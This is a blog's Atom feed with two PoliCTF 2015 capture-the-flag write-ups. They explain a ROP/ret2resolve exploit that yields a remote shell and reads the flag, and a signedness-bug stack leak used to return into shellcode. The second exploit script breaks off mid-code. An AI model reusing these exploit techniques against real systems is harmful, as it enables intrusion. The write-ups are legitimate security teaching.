<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-07-12T17:25:36+02:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - John's Shuffle]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle/"/>
    <updated>2015-07-12T17:06:29+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle</id>
    <content type="html"><![CDATA[<p>John&rsquo;s Shuffle was a 350 point pwnable for PoliCTF 2015. Here&rsquo;s how I cracked it!</p>

<!--more-->


<p>Again, it&rsquo;s a 32 bit ELF binary. Running it yields the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/polictf/johns-shuffle<span class="nv">$ </span>./johns-shuffle
</span><span class='line'>It all began as a mistake..
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>It all began as a mistake..
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>It all began as a mistake..
</span></code></pre></td></tr></table></div></figure>


<p>Not very useful. The disassembly provided some hints, for it had functions like <code>shuffle</code>, <code>unshuffle</code> and <code>bubblesort</code>. The program kicks off by clearing a lot of stack space and calling <code>unshuffle</code>. Then, it asks for user input, maximum size 0x44 bytes. I decided to enter 0x44 * <code>A</code> (what else?).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>... clear stack space ...
</span><span class='line'> 8048f30: call   8048df0 &lt;unshuffle&gt;
</span><span class='line'> 8048f35: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x804b078
</span><span class='line'> 8048f3c: call   <span class="m">8048710</span> &lt;puts@plt&gt;
</span><span class='line'> 8048f41: mov    eax,ds:0x804b0c0
</span><span class='line'> 8048f46: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 8048f49: call   80486c0 &lt;fflush@plt&gt;
</span><span class='line'> 8048f4e: mov    eax,ds:0x804b0a0
</span><span class='line'> 8048f53: mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,eax
</span><span class='line'> 8048f57: mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x44
</span><span class='line'> 8048f5f: lea    eax,<span class="o">[</span>esp+0x2c<span class="o">]</span>
</span><span class='line'> 8048f63: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 8048f66: call   80486e0 &lt;fgets@plt&gt;
</span></code></pre></td></tr></table></div></figure>


<p>When runnning the <code>shuffle</code> function, the program executes <code>system()</code>, which spawns <code>/bin/dash</code> on my system, effectively stopping me from debugging it in <code>gdb</code>. I patched system in gdb so it would return immediately and I could trace the program. Turns out <code>shuffle</code> takes the GOT entries, all the function pointers, and shuffles them around. <code>unshuffle</code> negates this operation. After the second time I entered 0x44 A&rsquo;s, the program crashed with control over EIP and EBP:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>start
</span><span class='line'>Temporary breakpoint 2, 0x08048ec2 in main <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>p system
</span><span class='line'><span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7e9ac30 &lt;system&gt;
</span><span class='line'>gdb-peda<span class="nv">$ </span><span class="nb">set</span> *0xf7e9ac30<span class="o">=</span>0xc3
</span><span class='line'>gdb-peda<span class="nv">$ </span>c
</span><span class='line'>It all began as a mistake..
</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'>
</span><span class='line'>It all began as a mistake..
</span><span class='line'>
</span><span class='line'>It all began as a mistake..
</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0x0
</span><span class='line'>EBX: 0xf7fbeff4 --&gt; 0x15fd7c
</span><span class='line'>ECX: 0x4
</span><span class='line'>EDX: 0x80487a6 <span class="o">(</span>&lt;difftime@plt+6&gt;:    push   0x88<span class="o">)</span>
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>ESP: 0xffffd5c0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">31</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>EIP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x41414141
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xffffd5c0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">31</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0004<span class="p">|</span> 0xffffd5c4 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">27</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xffffd5c8 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">23</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xffffd5cc <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">19</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0016<span class="p">|</span> 0xffffd5d0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">15</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0020<span class="p">|</span> 0xffffd5d4 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats <span class="m">11</span> <span class="nb">times</span>&gt;<span class="o">)</span>
</span><span class='line'>0024<span class="p">|</span> 0xffffd5d8 <span class="o">(</span><span class="s2">&quot;AAAAAAA&quot;</span><span class="o">)</span>
</span><span class='line'>0028<span class="p">|</span> 0xffffd5dc --&gt; 0x414141 <span class="o">(</span><span class="s1">&#39;AAA&#39;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x41414141 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Cool, easy control over EIP. However, at this point, we cannot rely on the GOT entries, because they are still shuffled! We can&rsquo;t just ret2system. I spent some time trying to return to <code>unshuffle</code>, but kept losing control of the program execution.</p>

<p>But let&rsquo;s take a step back here. Linux ELF binaries employ something called &ldquo;lazy linking&rdquo;. When a binary is started, the symbols are not resolved yet. Only when a function is called for the first time will the function address be resolved. The GOT entry will be pointing to this look up code (memcpy as example):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>080486d0 &lt;memcpy@plt&gt;:
</span><span class='line'> 80486d0: ff <span class="m">25</span> 1c b0 <span class="m">04</span> <span class="m">08</span>      jmp    DWORD PTR ds:0x804b01c
</span><span class='line'> 80486d6: <span class="m">68</span> <span class="m">20</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   0x20
</span><span class='line'> 80486db: e9 a0 ff ff ff          jmp    <span class="m">8048680</span> &lt;_init+0x2c&gt;
</span></code></pre></td></tr></table></div></figure>


<p>When called for the first time, <code>0x804b01c</code> will be pointing to <code>0x80486d6</code>, which will kick off the function resolver. So instead of using <code>0x80486d0</code> to do a memcpy, I&rsquo;d just use <code>0x80486d6</code>. This bypasses the mess that <code>shuffle</code> made!</p>

<p>With all this in hand, I wrote an exploit and the corresponding rop chain (well&hellip; more like ret2resolve ;)).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;shuffle.polictf.it&#39;</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;mistake..&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">rop</span> <span class="o">=</span> <span class="s">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048696</span><span class="p">)</span>  <span class="c"># resolve -&gt; read (so we can read in `/bin/sh`)</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804901d</span><span class="p">)</span> <span class="c"># pppr</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>         <span class="c"># stdin</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804b130</span><span class="p">)</span> <span class="c"># free mem area</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048726</span><span class="p">)</span> <span class="c"># resolve -&gt; system</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048746</span><span class="p">)</span> <span class="c"># resolve -&gt; exit (makes rasta_mouse happy!)</span>
</span><span class='line'>  <span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804b130</span><span class="p">)</span> <span class="c"># arg for system; will contain /bin/sh in a few moments</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;mistake..&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;mistake..&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;/bin/sh&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/polictf/johns-shuffle<span class="nv">$ </span>python poc.py
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>ctf<span class="o">)</span>
</span><span class='line'>cat /home/ctf/*
</span><span class='line'>flag<span class="o">{</span>rand0mizing_things_with_l0ve<span class="o">}</span>
</span><span class='line'>cat: /home/ctf/johnshuffle: Permission denied
</span></code></pre></td></tr></table></div></figure>


<p>Easy peasy! The flag was <code>flag{rand0mizing_things_with_l0ve}</code>. Nice!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - John's Library]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-library/"/>
    <updated>2015-07-12T16:45:04+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-library</id>
    <content type="html"><![CDATA[<p>Finally, pwnables! John&rsquo;s Library was worth 150 points. I was a bit rusty but I managed to grab this flag.</p>

<!--more-->


<p>We&rsquo;re given a 32 bit Linux ELF. Upon running it, we&rsquo;re presented with a library menu, where we can view titles, add them and exit the program:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Welcome to the jungle library mate! Try to escape!!
</span><span class='line'>
</span><span class='line'> r - <span class="nb">read </span>from library
</span><span class='line'> a - add element
</span><span class='line'> u - <span class="nb">exit</span>
</span><span class='line'>a
</span><span class='line'>Hey mate! Insert how long is the book title:
</span><span class='line'>10000
</span><span class='line'>Hey you! what are you trying to <span class="k">do</span>??
</span></code></pre></td></tr></table></div></figure>


<p>So we can&rsquo;t really add long titles. Upon inspection, Swappage and I noticed that the titles are stored on the stack, with the lengths in a special data structure in the <code>.data</code> of the binary:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> 8048731: mov    eax,DWORD PTR <span class="o">[</span>eax*4+0x804a060<span class="o">]</span> <span class="p">;</span> 0x804a060 contains lengths
</span><span class='line'> 8048738: mov    edx,eax
</span><span class='line'> 804873a: mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>         <span class="p">;</span> ptr to first book
</span><span class='line'> 804873d: add    eax,edx                         <span class="p">;</span> add length of last string to it
</span><span class='line'> 804873f: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'> 8048742: call   <span class="m">8048410</span> &lt;gets@plt&gt;              <span class="p">;</span> grab book title
</span></code></pre></td></tr></table></div></figure>


<p>I noticed I could bypass the length check with a large number, effectively utilizing a signedness bug. This allowed us to overwrite the return address of <code>main()</code> on the stack. Although NX wasn&rsquo;t enabled, ASLR was enabled so we couldn&rsquo;t just jump to the shellcode on the stack. There weren&rsquo;t enough gadgets for a ROP chain. Instead, we needed to leak a stack address so we could return to the shellcode on the stack (bruteforcing it didn&rsquo;t work). That&rsquo;s where the read function came into play.</p>

<p>Looking up a book title via the read function was done like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> 8048678: mov    eax,DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>         <span class="p">;</span> number we just submitted
</span><span class='line'> 804867b: mov    eax,DWORD PTR <span class="o">[</span>eax*4+0x804a060<span class="o">]</span> <span class="p">;</span> grab length of that book title
</span><span class='line'> 8048682: mov    edx,eax
</span><span class='line'> 8048684: mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>         <span class="p">;</span> pointer to book titles on stack
</span><span class='line'> 8048687: add    eax,edx                         <span class="p">;</span> add length of string so eax points to book title
</span><span class='line'> 8048689: mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
</span><span class='line'> 804868d: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048893
</span><span class='line'> 8048694: call   80483f0 &lt;<span class="nb">printf</span>@plt&gt;            <span class="p">;</span> dump title to user
</span></code></pre></td></tr></table></div></figure>


<p>By passing in a negative number, I was able to make <code>804867b: mov eax,DWORD PTR [eax*4+0x804a060]</code> point to <code>0x80493fc</code>, which contained <code>0xffffffe0</code>. Therefore, when this value is added to the pointer to the book titles, it actually is moved backwards and starts leaking stack addresses:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0xffffd1ab <span class="o">(</span>address of book titles on stack<span class="o">)</span> + <span class="nv">0xffffffe0</span> <span class="o">=</span>&gt;
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/10x <span class="nv">$eax</span>
</span><span class='line'>0xffffd18b:   0x048614-&gt;ff 0xffd1ab&lt;-08 0x000002ff  0x15fd7c00
</span><span class='line'>0xffffd19b:   0x15fd7c00  0x15fd7c00  0x0000f000  0x0000f000
</span></code></pre></td></tr></table></div></figure>


<p>I now had a way to leak the book title buffer on the stack, where we could store shellcode in a book title. By exploiting the signedness bug, we could overwrite the return address of <code>main()</code>. After setting all of this up, we&rsquo;d ask the binary to exit and make it return to our shellcode. Putting it all together:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendln</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">b</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">sendbin</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;library.polictf.it&#39;</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
</span><span class='line'>
